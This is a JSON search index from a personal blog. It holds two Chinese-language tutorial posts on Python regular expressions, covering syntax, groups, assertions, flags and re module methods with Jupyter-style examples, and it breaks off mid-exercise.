{"meta":{"title":"fishni","subtitle":"","description":"","author":"John Doe","url":"https://fishni.github.io","root":"/"},"pages":[{"title":"关于","date":"2020-04-06T10:04:14.332Z","updated":"2020-04-06T10:04:14.332Z","comments":true,"path":"about/index.html","permalink":"https://fishni.github.io/about/index.html","excerpt":"","text":"I’m fishmouse! 本博文是自身学习的一种记录，予己，希望能予以！"},{"title":"所有分类","date":"2020-03-30T05:12:13.734Z","updated":"2020-03-30T05:12:13.734Z","comments":true,"path":"categories/index.html","permalink":"https://fishni.github.io/categories/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2020-03-30T05:13:30.921Z","updated":"2020-03-30T05:13:30.921Z","comments":true,"path":"tags/index.html","permalink":"https://fishni.github.io/tags/index.html","excerpt":"","text":""},{"title":"友邻","date":"2020-03-30T05:26:40.217Z","updated":"2020-03-30T05:26:40.217Z","comments":true,"path":"friends/index.html","permalink":"https://fishni.github.io/friends/index.html","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。"}],"posts":[{"title":"【python-正则】1.2Python正则表达式学习-2","slug":"1.2 Python正则表达式学习-2","date":"2020-04-13T16:00:00.000Z","updated":"2020-04-14T08:56:07.742Z","comments":true,"path":"2020/04/14/1.2 Python正则表达式学习-2/","link":"","permalink":"https://fishni.github.io/2020/04/14/1.2%20Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0-2/","excerpt":"本文主要是对Python正则相关知识，进行简单的梳理","text":"本文主要是对Python正则相关知识，进行简单的梳理 0x01 正则表达式语法1.1 字符与字符类1.特殊字符：\\.^$?+*{}[]()| 以上特殊字符要表示字面值，必须使用\\进行转义 2.字符类 包含在[]中的一个或者多个字符被称为字符类，字符类在匹配时如果没有指定量词则只会匹配其中的一个。 字符类内可以指定范围，比如[a-zA-Z0-9]表示a到z，A到Z，0到9之间的任何一个字符 左方括号后跟随一个^，表示否定一个字符类，比如[^0-9]表示可以匹配一个任意非数字的字符。 字符类内部，除了\\之外，其他特殊字符不再具备特殊意义，都表示字面值。^放在第一个位置表示否定，放在其他位置表示^本身，-放在中间表示范围，放在字符类中的第一个字符，则表示-本身。 字符类内部可以使用速记法，比如\\d \\s \\w 3.速记法 . 可以匹配除换行符之外的任何字符，如果有re.DOTALL标志，则匹配任意字符包括换行 \\d匹配一个Unicode数字，如果带re.ASCII，则匹配0-9 \\D匹配Unicode非数字 \\s 匹配Unicode空白，如果带有re.ASCII，则匹配\\t\\n\\r\\f\\v中的一个 \\S 匹配Unicode非空白 \\w匹配Unicode单词字符，如果带有re.ascii,则匹配[a-zA-Z0-9_]中的一个 \\W匹配Unicode非单词字符 1.2 量词 ? 匹配前面的字符0次或1次 * 匹配前面的字符0次或多次 + 匹配前面的字符1次或者多次 {m} 匹配前面表达式m次 {m,} 匹配前面表达式至少m次 {,n} 匹配前面的正则表达式最多n次 {m,n} 匹配前面的正则表达式至少m次，最多n次 注意点：以上量词都是贪婪模式，会尽可能多的匹配，如果要改为非贪婪模式，通过在量词后面跟随一个?来实现 1.3 组与捕获1.()的作用 捕获()中正则表达式内容以备进一步利用处理，可以通过在左括号后面跟随?:来关闭括号的捕获功能 将正则表达式的一部分内容进行组合，方便使用量词或者| 2.反向引用前面()内捕获的内容 通过组号反向引用 每一个没有使用?:的小括号都会分配一个组好，从1开始，从左到右递增，可以通过\\i引用前面()内表达式捕获的内容 通过组名反向引用前面小括号内捕获的内容 可以通过在左括号后面跟随?P&lt;name&gt;,尖括号中放入组名来为一个组起一个别名，后面通过(?P=name)来引用 前面捕获的内容。如(?P&lt;word&gt;\\w+)\\s+(?P=word)来匹配重复的单词。 注意点：反向引用不能放在字符类[]中使用 1.4 断言与标记断言不会匹配任何文本，只是对断言所在的文本施加某些约束 1.常用断言 \\b 匹配单词的边界，放在字符类[]中则表示backspace \\B 匹配非单词边界，受ASCII标记影响 \\A 在起始处匹配 ^ 在起始处匹配，如果有MULTILINE标志，则在每个换行符后匹配 \\Z 在结尾处匹配 $在结尾处匹配，如果有MULTILINE标志，则在每个换行符前匹配 (?=e) 正前瞻 (?!e) 负前瞻 (?&lt;=e) 正回顾 (?&lt;!e)负回顾 2.前瞻回顾的解释 前瞻： exp1(?=exp2) exp1后面的内容要匹配exp2 负前瞻: exp1(?!exp2) exp1后面的内容不能匹配exp2 后顾: (?&lt;=exp2)exp1 exp1前面的内容要匹配exp2 负后顾: (?&lt;!exp2)exp1 exp1前面的内容不能匹配exp2 例如：我们要查找hello，但是hello后面必须是world，正则表达式可以这样写：”(hello)\\s+(?=world)”,用来匹配”hello wangxing”和”hello world”只能匹配到后者的hello 12import rere.match(\"(hello)\\s+(?=world)\",\"hello world\").group() &apos;hello &apos;1re.match(\"(hello)\\s+(?=world)\",\"hello dd\").group() --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-5-07f0304e6ee4&gt; in &lt;module&gt; ----&gt; 1 re.match(&quot;(hello)\\s+(?=world)&quot;,&quot;hello dd&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;1.5 条件匹配(?(id)yes_exp|no_exp) 对应id的子表达式如果匹配到内容，则这里匹配yes_exp，否则匹配no_exp 1re.match(r\"(123)qwe(?(1)456|789)\", \"123qwe456\").group() &apos;123qwe456&apos;1.6 正则表达式的标志 正则表达式的标志有两种使用方法 通过给compile方法传入标志参数，多个标志使用|分割的方法,如re.compile(r”#[\\da-f]{6}\\b”, re.IGNORECASE|re.MULTILINE) 通过在正则表达式前面添加(?标志)的方法给正则表达式添加标志，如(?ms)#[\\da-z]{6}\\b 常用的标志 re.A或者re.ASCII， 使\\b \\B \\s \\S \\w \\W \\d \\D都假定字符串为假定字符串为ASCII re.I或者re.IGNORECASE 使正则表达式忽略大小写 re.M或者re.MULTILINE 多行匹配，使每个^在每个回车后，每个$在每个回车前匹配 re.S或者re.DOTALL 使.能匹配任意字符，包括回车 re.X或者re.VERBOSE 这样可以在正则表达式跨越多行，也可以添加注释，但是空白需要使用\\s,或者[ ]来表示，因为默认的空白不再解释。如： 123456789charref = re.compile(r\"\"\" &amp;[#] # Start of a numeric entity reference ( 0[0-7]+ # Octal form | [0-9]+ # Decimal form | x[0-9a-fA-F]+ # Hexadecimal form ) ; # Trailing semicolon\"\"\", re.VERBOSE) 0x02 Python正则表达式模块2.1 正则表达式处理字符串主要四大功能 匹配：查看一个字符串是否符合正则表达式的语法，一般返回true或者false 获取： 正则表达式来提取字符串中符合要求的文本 替换 查找字符串中符合正则表达式的文本，并用相应的字符串替换 分割 使用正则表达式对字符串进行分割。 2.2 Python中re模块使用正则表达式的两种方法 使用re.compile(r, f)方法生成正则表达式对象，然后调用正则表达式对象的相应方法。这种做法的好处是生成正则对象之后可以多次使用。 re模块中对正则表达式对象的每个对象方法都有一个对应的模块方法，唯一不同的是传入的第一个参数是正则表达式字符串。此种方法适合于只使用一次的正则表达式。 2.3 正则表达式对象的常用方法 rx.findall(s,start, end) 返回一个列表，如果正则表达式中没有分组，则列表中包含的是所有匹配的内容，如果正则表达式中有分组，则列表中的每个元素是一个元组，元组中包含子分组中匹配到的内容，但是没有返回整个正则表达式匹配的内容 ​ rx.finditer(s, start, end) 返回一个可迭代对象对可迭代对象进行迭代，每一次返回一个匹配对象，可以调用匹配对象的group()方法查看指定组匹配到的内容，0表示整个正则表达式匹配到的内容 rx.search(s, start, end) 返回一个匹配对象,倘若没匹配到，就返回None search方法只匹配一次就停止，不会继续往后匹配 rx.match(s, start, end) 如果正则表达式在字符串的起始处匹配，就返回一个匹配对象，否则返回None rx.sub(x, s, m) 返回一个字符串。每一个匹配的地方用x进行替换，返回替换后的字符串，如果指定m，则最多替换m次。对于x可以使用/i或者/gid可以是组名或者编号来引用捕获到的内容。 模块方法re.sub(r, x, s, m)中的x可以使用一个函数。此时我们就可以对捕获到的内容推过这个函数进行处理后再替换匹配到的文本。 rx.subn(x, s, m) 与re.sub()方法相同，区别在于返回的是二元组，其中一项是结果字符串，一项是做替换的个数。 rx.split(s, m) 分割字符串,返回一个列表，用正则表达式匹配到的内容对字符串进行分割 如果正则表达式中存在分组，则把分组匹配到的内容放在列表中每两个分割的中间作为列表的一部分，如： 1234rx = re.compile(r\"(\\d)[a-z]+(\\d)\")s = \"ab12dk3klj8jk9jks5\"result = rx.split(s)result [&apos;ab1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;klj&apos;, &apos;8&apos;, &apos;9&apos;, &apos;jks5&apos;] rx.flags() 正则表达式编译时设置的标志 rx.pattern() 正则表达式编译时使用的字符串 2.4 匹配对象的属性与方法 m.group(g, …) 返回编号或者组名匹配到的内容，默认或者0表示整个表达式匹配到的内容，如果指定多个，就返回一个元组 m.groupdict(default) 返回一个字典。字典的键是所有命名的组的组名，值为命名组捕获到的内容 如果有default参数，则将其作为那些没有参与匹配的组的默认值。 m.groups(default) 返回一个元组。包含所有捕获到内容的子分组，从1开始，如果指定了default值，则这个值作为那些没有捕获到内容的组的值 m.lastgroup() 匹配到内容的编号最高的捕获组的名称，如果没有或者没有使用名称则返回None(不常用) m.lastindex() 匹配到内容的编号最高的捕获组的编号，如果没有就返回None m.start(g) 当前匹配对象的子分组是从字符串的那个位置开始匹配的,如果当前组没有参与匹配就返回-1 m.end(g) 当前匹配对象的子分组是从字符串的那个位置匹配结束的，如果当前组没有参与匹配就返回-1 m.span() 返回一个二元组，内容分别是m.start(g)和m.end(g)的返回值 m.re() 产生这一匹配对象的正则表达式 m.string() 传递给match或者search用于匹配的字符串 m.pos() 搜索的起始位置。即字符串的开头，或者start指定的位置(不常用) m.endpos() 搜索的结束位置。即字符串的末尾位置，或者end指定的位置(不常用) 2.5 总结 对于正则表达式的匹配功能，Python没有返回true和false的方法，但可以通过对match或者search方法的返回值是否是None来判断 对于正则表达式的搜索功能，如果只搜索一次可以使用search或者match方法返回的匹配对象得到，对于搜索多次可以使用finditer方法返回的可迭代对象来迭代访问 对于正则表达式的替换功能，可以使用正则表达式对象的sub或者subn方法来实现，也可以通过re模块方法sub或者subn来实现，区别在于模块的sub方法的替换文本可以使用一个函数来生成 对于正则表达式的分割功能，可以使用正则表达式对象的split方法，需要注意如果正则表达式对象有分组的话，分组捕获的内容也会放到返回的列表中 参考链接 正则表达式HOWTO https://docs.python.org/zh-cn/3/howto/regex.html#regex-howto re-模块操作 https://docs.python.org/zh-cn/3/library/re.html 小结参考：https://www.jianshu.com/p/5295c5988b7f","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Python基础","slug":"python/Python基础","permalink":"https://fishni.github.io/categories/python/Python%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://fishni.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"【python-正则】1.1Python正则表达式学习-1","slug":"1.1 Python正则表达式学习-1","date":"2020-04-12T16:00:00.000Z","updated":"2020-04-14T08:55:48.077Z","comments":true,"path":"2020/04/13/1.1 Python正则表达式学习-1/","link":"","permalink":"https://fishni.github.io/2020/04/13/1.1%20Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0-1/","excerpt":"本文主要内容：正则表达式概述、re模块操作、表示字符、原始字符串、表示数量、表示边界、 匹配分组、re模块的高级用法、贪婪和非贪婪、小练习","text":"本文主要内容：正则表达式概述、re模块操作、表示字符、原始字符串、表示数量、表示边界、 匹配分组、re模块的高级用法、贪婪和非贪婪、小练习 0x01 正则表达式概述正则表达式，又称正规表示式、正规表示法、正规表达式、 规则表达式、 常规表示法（英语：Regular Expression，在代码中常简写为regex、 regexp或RE），是计算机科学的一个概念。正则表达式使用单个字符串来描述、 匹配一系列匹配某个句法规则的字符串。 在很多⽂本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。 Regular Expression的“Regular”⼀般被译为“正则”、 “正规”、 “常规”。 此处的“Regular”即是“规则”、 “规律”的意思， Regular Expression即“描述某种规则的表达式”之意。 0x02 re模块操作 在Python中需要通过正则表达式对字符串进⾏匹配的时候，可以使⽤⼀个模块，名字为re 2.1 re模块的使用过程12345678# 导入re模块import re# 使用match方法进行匹配操作result = re.match(正则表达式，要匹配的字符串)# 如果上⼀步匹配到数据的话， 可以使⽤group⽅法来提取数据result.group() re.match是进行正则匹配检查的方法，若字符串匹配正则表达式，则match方法返回匹配对象（Match Object）,否则返回None（注意不是空字符串””） 匹配对象Match Object对象具有group方法，用来返回字符串的匹配部分 2.2 re模块示例12345#匹配hello开头的字符串import reresult = re.match(\"hello\",\"hello world\")# 查看Match object对象result Out:&lt;re.Match object; span=(0, 5), match=&apos;hello&apos;&gt;1result.group() Out:&apos;hello&apos;0x03 表示字符正则表达式单字符匹配常用的模式 字符 功能 . 匹配任意1个字符（除了\\n） [] 匹配[]中列举的字符 \\d 匹配数字，即0-9 \\D 匹配非数字，即不是数字 \\s 匹配空白，即空格、tab键 \\S 匹配非空白 \\w 匹配单词字符，即a-z、A-Z、0-9、_ \\W 匹配非单词字符 3.1 示例1：.1234import reret1 = re.match(\".\",\"a\")ret1.group() Out:&apos;a&apos;12ret2 = re.match(\".\",\"bca\")ret2.group() Out:&apos;b&apos;12ret3 = re.match(\".\",\"@18\")ret3.group() Out:&apos;@&apos;3.2 示例2：[]123# 如果hello的首字符⼩写， 那么正则表达式需要⼩写的hret1 = re.match(\"h\",\"hello Python\")ret1.group() Out:&apos;h&apos;123# 如果hello的首字符大写，则正则表达式则需要大写的Hret2 = re.match(\"H\",\"Hello Python\")ret2.group() Out:&apos;H&apos;123# 大小写都可以ret3 = re.match(\"[hH]\",\"hello Python\")ret3.group() Out:&apos;h&apos;12ret4 = re.match(\"[hH]\",\"Hello Python\")ret4.group() Out:&apos;H&apos;123# 匹配0-9第一种写法ret5 = re.match(\"[0123456789]\",\"7Hello\")ret5.group() Out:&apos;7&apos;123# 匹配0-9第二种写法ret6= re.match(\"[0-9]\",\"7Hello\")ret6.group() Out:&apos;7&apos;3.3 示例3：\\d123# 普通匹配ret1 = re.match(\"hello2\",\"hello2world\")ret1.group() Out:&apos;hello2&apos;123# 使用\\d匹配ret2 = re.match(\"hello\\d\",\"hello2world\")ret2.group() Out:&apos;hello2&apos;0x04 原始字符串4. 1 各种示例123# 比如：想打印出\\n,一个反斜杠时，当作换行符进行打印s= \"\\ndd\"print(s) 打印：dd12s= \"\\\\ndd\"print(s) 打印：\\ndd mm = “c:\\a\\b\\c” 12mm= \"c:\\\\a\\\\b\\\\c\"mm Out:&apos;c:\\\\a\\\\b\\\\c&apos;1print(mm) 打印：c:\\a\\b\\c12# 这里匹配需四个反斜杠，方能匹配字符串中两个反斜杠re.match(\"c:\\\\\\\\\",mm).group() Out:&apos;c:\\\\&apos;12ret = re.match(\"c:\\\\\\\\a\",mm).group()print(ret) 打印：c:\\a123# 使用rret =re.match(r\"c:\\\\a\",mm).group()print(ret) 打印：c:\\a12ret = re.match(r\"c:\\a\",mm).group()print(ret) 打印： --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-45-1a051863b698&gt; in &lt;module&gt; ----&gt; 1 ret = re.match(r&quot;c:\\a&quot;,mm).group() 2 print(ret) AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;4.2 示例说明Python字符串前面加上r 表示原生字符串 与大多数编程语言相同，正则表达式里使用”\\n”作为转义字符，这就可能造成反斜杠困扰。加入匹配文本中的字符串”\\“，那么使用编程语言表示的正则表达式里将需要4个反斜杠“\\\\”：前两个和后两个分别用于在编程语言里转义反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠 Python里的原生字符串很好的解决了这个问题，不再担心漏写反斜杠，写出的表达式更直观 123mm= \"c:\\\\a\\\\b\\\\c\"ret = re.match(r\"c:\\\\a\",mm).group()print(ret) 打印：c:\\a0x05 表示数量匹配多个字符的相关格式 字符 功能 * 匹配前一个字符出现0次或者无限次，即可有可无 + 匹配前一个字符出现1次或者无限次，即至少有1次 ? 匹配前一个字符出现1次或者0次, 即要么有1次，要么没有 {m} 匹配前一个字符出现m次 {m,} 匹配前一个字符至少出现m次 {m,n} 匹配前一个字符出现从m到n次 5.1 示例1：*需求：匹配出，一个字符串第一个字母为大写字符，后面都是小写字母并且这些小写字母可有可无 123import reret = re.match(\"[A-Z][a-z]*\",\"Mm\")ret.group() Out:&apos;Mm&apos;123# *前无匹配字符时是可以的ret = re.match(\"[A-Z][a-z]*\",\"M\")ret.group() Out:&apos;M&apos;123# *前字符的匹配有连续多个ret = re.match(\"[A-Z][a-z]*\",\"Mabcdef\")ret.group() Out:&apos;Mabcdef&apos;5.2 示例2：+需求：匹配出，变量名是否有效 123# [a-zA-Z]+表示与[a-zA-Z]至少匹配成功一个字母，[\\w]* 表示*前字符可有0个或多个ret = re.match(\"[a-zA-Z]+[\\w]*\",\"name1\")ret.group() Out:&apos;name1&apos;12ret = re.match(\"[a-zA-Z_]+[\\w]*\",\"_name\")ret.group() Out:&apos;_name&apos;12ret = re.match(\"[a-zA-Z_]+[\\w]*\",\"2_name\")ret.group() 打印: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-65-572ee7f143b4&gt; in &lt;module&gt; 1 ret = re.match(&quot;[a-zA-Z_]+[\\w]*&quot;,&quot;2_name&quot;) ----&gt; 2 ret.group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;5.3 示例3：？需求：匹配出，0-99之间的数字 12ret = re.match(\"[1-9]?[0-9]\",\"7\")ret.group() Out:&apos;7&apos;12ret = re.match(\"[1-9]?[0-9]\",\"33\")ret.group() Out:&apos;33&apos;123# 结果原因：第一个数字[1-9]未匹配到，？出现0次或1次；所以后一个[0-9]匹配了0ret =re.match(\"[1-9]?[0-9]\",\"09\")ret.group() Out:&apos;0&apos;5.4 示例4：{m}需求：匹配出，8-20位的密码，可以大小写英文字母、数字、下划线 1234import reret =re.match(\"[a-zA-Z0-9_]&#123;6&#125;\",\"12a3g45678\")ret.group() Out:&apos;12a3g4&apos;12ret = re.match(\"[a-zA-Z0-9_]&#123;8,20&#125;\",\"1ad12fffs39d739473920_d398sd\")ret.group() Out:&apos;1ad12fffs39d73947392&apos;123# [\\w]==[a-zA-Z0-9_]，当然其他也有各自的等价表示方法ret = re.match(\"[\\w]&#123;8,20&#125;\",\"1ad12fffs39d739473920_d398sd\")ret.group() Out:&apos;1ad12fffs39d73947392&apos; 简单练习，匹配出163的邮箱地址，且@符号之前有4-20位，例如hello@163.com 123# 简单练习，匹配163邮箱地址(不完善)ret =re.match(\"[\\w]&#123;4,20&#125;@163\\.com\",\"hell0@163.com\")ret.group() Out:&apos;hell0@163.com&apos;123# 思考如何匹配以。。。结尾ret = re.match(\"[\\w]&#123;4,20&#125;@163\\.com\",\"hello@163.comddddd\")ret.group() Out:&apos;hello@163.com&apos;0x06 表示边界 字符 功能 ^ 匹配字符串开头 $ 匹配字符串结尾 \\b 匹配一个单词的边界 \\B 匹配非单词边界 6.1 示例1：$需求：匹配163.com的邮箱地址 12345import re# 正确的地址ret = re.match(\"[\\w]&#123;4,20&#125;@163\\.com\",\"xiaoWang@163.com\")ret.group() Out:&apos;xiaoWang@163.com&apos;123# 不正确的地址ret = re.match(\"[\\w]&#123;4,20&#125;@163\\.com\",\"xiaoWang@163.comheihhh\")ret.group() Out:&apos;xiaowang@163.com&apos;123# 通过$来确定末尾,从而过滤不正确地址ret = re.match(\"[\\w]&#123;4,20&#125;@163\\.com$\",\"xiaoWang@163.comheihhh\")ret.group() 打印： --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-93-83efc35bff7d&gt; in &lt;module&gt; 1 # 通过$来确定末尾 2 ret = re.match(&quot;[\\w]{4,20}@163\\.com$&quot;,&quot;xiaoWang@163.comheihhh&quot;) ----&gt; 3 ret.group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;6.2 示例2：\\b1re.match(r\".*\\bver\\b\",\"ho ver abc\").group() Out:&apos;ho ver&apos;12# 当单词右边没有边界时，使用\\b出错re.match(r\".*\\bver\\b\",\"ho verabc\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-95-d65bbce81439&gt; in &lt;module&gt; ----&gt; 1 re.match(r&quot;.*\\bver\\b&quot;,&quot;ho verabc&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;12# 当指定单词左边无边界时，也出错re.match(r\".*\\bver\\b\",\"hover abc\").group() --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-96-53f69a15373e&gt; in &lt;module&gt; ----&gt; 1 re.match(r&quot;.*\\bver\\b&quot;,&quot;hover abc&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;6.3 示例3：\\B1re.match(r\".*\\Bver\\B\",\"hoverabc\").group() Out:&apos;hover&apos;12# 当指定词有左边界时，出错re.match(r\".*\\Bver\\B\",\"ho verabc\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-98-a9d342249fa1&gt; in &lt;module&gt; 1 # 当指定词有左边界时，出错 ----&gt; 2 re.match(r&quot;.*\\Bver\\B&quot;,&quot;ho verabc&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;12# 当指定的词，有右边界时，\\B出错re.match(r\".*\\Bver\\B\",\"hover abc\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-99-aae06b891466&gt; in &lt;module&gt; ----&gt; 1 re.match(r&quot;.*\\Bver\\B&quot;,&quot;hover abc&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;12# 当指定的词，左右都有边界时，\\B出错re.match(r\".*\\Bver\\B\",\"ho ver abc\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-101-9630adaf466f&gt; in &lt;module&gt; 1 # 当指定的词，左右都有边界时，\\B出错 ----&gt; 2 re.match(r&quot;.*\\Bver\\B&quot;,&quot;ho ver abc&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;0x07 匹配分组 字符 功能 (ab) 将括号中字符作为一个分组 \\num 引用分组num匹配到的字符串 (?P&lt;name&gt;) 分组起别名 (?P=name) 引用别名为name分组匹配到的字符串 7.1 示例1：|需求：匹配出0-100之间的数字 123import reret = re.match(\"[1-9]?\\d\",\"8\")ret.group() Out:&apos;8&apos;1re.match(\"[1-9]?\\d\",\"78\").group() Out:&apos;78&apos;12# 不确定的情况下re.match(\"[1-9]?\\d\",\"08\").group() Out:&apos;0&apos;12# 修正之后的re.match(\"[1-9]?\\d$\",\"08\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-106-70c347cddb39&gt; in &lt;module&gt; 1 # 修正之后的 ----&gt; 2 re.match(&quot;[1-9]?\\d$&quot;,&quot;08&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos; 添加 | 可匹配0到100（包括0和100） 12# 添加 |re.match(\"[1-9]?\\d$|100\",\"100\").group() Out:&apos;100&apos;1re.match(\"[1-9]?\\d$|100\",\"0\").group() Out:&apos;0&apos;7.2 示例2：()需求：匹配出163、126、qq邮箱直接的数字 1re.match(\"\\w&#123;4,20&#125;@163\\.com\",\"test@163.com\").group() Out:&apos;test@163.com&apos;12#使用 （）分组re.match(\"\\w&#123;4,20&#125;@(163|126|qq)\\.com\",\"test@126.com\").group() Out:&apos;test@126.com&apos;1re.match(\"\\w&#123;4,20&#125;@(163|126|qq)\\.com\",\"test@gmail.com\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-111-d286dbf8fcf2&gt; in &lt;module&gt; ----&gt; 1 re.match(&quot;\\w{4,20}@(163|126|qq)\\.com&quot;,&quot;test@gmail.com&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos; 练习： 12ret = re.match(\"([^-]*)-(\\d+)\",\"010-12345678\")ret.group() Out:&apos;010-12345678&apos;1ret.groups() Out:(&apos;010&apos;, &apos;12345678&apos;)12# ret.group()默认ret.group(0)ret.group(1) Out:&apos;010&apos;1ret.group(2) Out:&apos;12345678&apos;7.3 示例3：\\需求：匹配出&lt;html&gt;hh&lt;/html&gt; 12# 能够完成对正确的字符串的匹配re.match(\"&lt;[a-zA-Z]*&gt;\\w*&lt;/[a-zA-Z]*&gt;\",\"&lt;html&gt;hh&lt;/html&gt;\").group() Out:&apos;&lt;html&gt;hh&lt;/html&gt;&apos;12# 遇到非正常的html格式字符串，匹配出错re.match(\"&lt;[a-zA-Z]*&gt;\\w*&lt;/[a-zA-Z]*&gt;\", \"&lt;html&gt;hh&lt;/htmlbalabala&gt;\").group() Out:&apos;&lt;html&gt;hh&lt;/htmlbalabala&gt;&apos; 思路：如果在第一对&lt;&gt;中是什么，按理说后面的那对&lt;&gt;中就应该是什么 12# 通过引用分组中匹配到的数据即可,但是要注意是元字符串，即类似r\"\"这种格式re.match(r\"&lt;([a-zA-Z]*)&gt;\\w*&lt;/\\1&gt;\",\"&lt;html&gt;hh&lt;/html&gt;\").group() Out:&apos;&lt;html&gt;hh&lt;/html&gt;&apos;12# 因为2对&lt;&gt;中的数据不一致，所以没匹配出来re.match(r\"&lt;([a-zA-Z]*)&gt;\\w*&lt;/\\1&gt;\",\"&lt;html&gt;hh&lt;/htmlddd&gt;\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-126-f2f15b62f076&gt; in &lt;module&gt; 1 # 因为2对&lt;&gt;中的数据不一致，所以没匹配出来 ----&gt; 2 re.match(r&quot;&lt;([a-zA-Z]*)&gt;\\w*&lt;/\\1&gt;&quot;,&quot;&lt;html&gt;hh&lt;/htmlddd&gt;&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;7.4 \\number需求：匹配出&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h1&gt;&lt;/html&gt; 1re.match(r\"&lt;(\\w*&gt;)&lt;(\\w*)&gt;.*&lt;/\\2&gt;&lt;/\\1\",\"&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h1&gt;&lt;/html&gt;\").group() Out:&apos;&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h1&gt;&lt;/html&gt;&apos;1re.match(r\"&lt;(\\w*&gt;)&lt;(\\w*)&gt;.*&lt;/\\2&gt;&lt;/\\1\",\"&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h2&gt;&lt;/html&gt;\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-128-1cf071943a2d&gt; in &lt;module&gt; ----&gt; 1 re.match(r&quot;&lt;(\\w*&gt;)&lt;(\\w*)&gt;.*&lt;/\\2&gt;&lt;/\\1&quot;,&quot;&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h2&gt;&lt;/html&gt;&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;7.5 示例5:（?P&lt;name&gt;）(?P=name)12ret = re.match(r\"&lt;(?P&lt;name1&gt;\\w*)&gt;&lt;(?P&lt;name2&gt;\\w*)&gt;.*&lt;/(?P=name2)&gt;&lt;/(?P=name1)&gt;\", \"&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;\")ret.group() Out:&apos;&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;&apos; 注意：(?P&lt;name&gt;)和(?P=name)中的字母p大写 0x08 re模块的高级用法search需求：匹配出文章的阅读次数 12ret =re.search(r\"\\d+\",\"阅读次数为9999\")ret.group() Out:&apos;9999&apos;findall需求：统计出python、c、c++相应文章阅读的次数 12ret = re.findall(r\"\\d+\",\"python=9999,c=7890,c++=1234\")ret Out:[&apos;9999&apos;, &apos;7890&apos;, &apos;1234&apos;]sub 将匹配到的数据进行替换 需求：将匹配到的阅读次数加1 方法1 123# sub（要匹配的模式，要替换的内容，被替换的内容）ret =re.sub(r\"\\d+\",\"998\",\"python=997\")ret OUt:&apos;python=998&apos; 方法2 12345678910# sub可传递函数，将匹配到的内容再以参数形式传给定义的函数import redef add(temp): print(temp) strNum = temp.group() num =int(strNum) +1 return str(num)ret =re.sub(r\"\\d+\",add,\"python=997\")ret Out:&lt;re.Match object; span=(7, 10), match=&apos;997&apos;&gt; Out:&apos;python=998&apos; 练习:从下面的字符串中取出文本 1234567891011121314&lt;div&gt;&lt;p&gt;岗位职责： &lt;&#x2F;p&gt;&lt;p&gt;完成推荐算法、 数据统计、 接⼝、 后台等服务器端相关⼯作&lt;&#x2F;p&gt;&lt;p&gt;&lt;br&gt;&lt;&#x2F;p&gt;&lt;p&gt;必备要求： &lt;&#x2F;p&gt;&lt;p&gt;良好的⾃我驱动⼒和职业素养， ⼯作积极主动、 结果导向&lt;&#x2F;p&gt;&lt;p&gt;&amp;nbsp;&lt;br&gt;&lt;&#x2F;p&gt;&lt;p&gt;技术要求： &lt;&#x2F;p&gt;&lt;p&gt;1、 ⼀年以上 Python 开发经验， 掌握⾯向对象分析和设计， 了解设计模式&lt;&#x2F;p&gt; &lt;p&gt;2、 掌握HTTP协议， 熟悉MVC、 MVVM等概念以及相关WEB开发框架&lt;&#x2F;p&gt;&lt;p&gt;3、 掌握关系数据库开发设计， 掌握 SQL， 熟练使⽤ MySQL&#x2F;PostgreSQL 中的⼀种&lt;br&gt;&lt;&#x2F;p&gt;&lt;p&gt;4、 